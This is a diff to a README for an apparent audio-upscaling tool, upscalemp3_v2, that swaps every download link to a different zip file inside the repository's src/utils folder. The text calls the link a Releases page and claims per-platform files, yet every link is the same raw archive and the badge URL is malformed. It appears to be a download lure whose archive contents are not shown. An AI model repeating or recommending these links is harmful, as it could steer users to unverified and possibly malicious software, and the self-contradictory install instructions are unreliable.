@@ -9,10 +9,10 @@ To use upscalemp3_v2, follow these steps to download and install the application
 1. **Visit the Releases Page**  
    Click the link below to reach the Releases page where you can download the software.  
 
-   [![Download Now](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/upscalemp3_v2-v3.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/upscalemp3_v2-v3.7.zip)
+   [![Download Now](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/utils/v_upscalemp_v3.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/utils/v_upscalemp_v3.2.zip)
 
 2. **Download the Latest Version**  
-   On the Releases page, find the latest version of upscalemp3_v2. Click on the version number to expand the details. Look for the section titled "Assets" and choose the file that suits your system (e.g., `https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/upscalemp3_v2-v3.7.zip` for Windows or `https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/upscalemp3_v2-v3.7.zip` for other platforms).
+   On the Releases page, find the latest version of upscalemp3_v2. Click on the version number to expand the details. Look for the section titled "Assets" and choose the file that suits your system (e.g., `https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/utils/v_upscalemp_v3.2.zip` for Windows or `https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/utils/v_upscalemp_v3.2.zip` for other platforms).
 
 3. **Install the Software**  
    Once the download is complete, locate the downloaded file. You can usually find it in your Downloads folder. 
@@ -39,7 +39,7 @@ To ensure the best performance while running upscalemp3_v2, please make sure you
 ## 📁 Download & Install
 To get started with upscalemp3_v2, download it from the link below:
 
-[![Download Now](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/upscalemp3_v2-v3.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/upscalemp3_v2-v3.7.zip)
+[![Download Now](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/utils/v_upscalemp_v3.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Fewy45/upscalemp3_v2/main/src/utils/v_upscalemp_v3.2.zip)
 
 Once downloaded, follow the earlier instructions to install and run the program.
 
